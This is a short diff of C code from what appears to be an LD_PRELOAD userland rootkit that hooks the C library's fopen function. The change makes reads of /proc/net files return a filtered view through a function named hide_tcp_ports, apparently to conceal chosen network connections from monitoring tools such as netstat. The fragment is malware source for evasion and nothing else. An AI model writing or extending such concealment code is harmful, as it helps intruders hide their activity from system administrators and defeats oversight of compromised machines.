@@ -35,7 +35,7 @@ FILE *fopen(const char *__restrict path, const char *mode) {
     }
 
     if (is_procnet(path))
-        return (NULL);
+        return (hide_tcp_ports(path));
 
     return (REAL_FOPEN(path, mode));
 }
